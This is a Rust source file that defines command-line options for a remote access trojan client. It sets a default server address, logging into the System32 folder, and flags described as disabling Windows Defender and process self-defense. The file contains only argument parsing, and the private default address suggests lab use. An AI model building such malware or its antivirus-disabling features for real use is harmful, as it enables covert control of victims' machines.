use clap::{Parser, crate_description, crate_version};

#[derive(Debug, Parser)]
#[command(
    long_about = crate_description!(),
    propagate_version = true,
    version = crate_version!(),
)]
pub struct Arguments {
    /// Host of the RAT server to connect to
    #[arg(long, default_value = "192.168.56.1:12110")]
    pub host: String,

    /// The logging level
    #[arg(long, default_value = "info")]
    pub log_level: String,

    /// Path to the log file, relative to System32 directory
    #[arg(long, default_value = "violet.log")]
    pub log_path: String,

    /// Disable Windows Defender
    #[arg(long)]
    pub disable_wd: bool,

    /// Disable process self-defense
    #[arg(long)]
    pub disable_sd: bool,
}
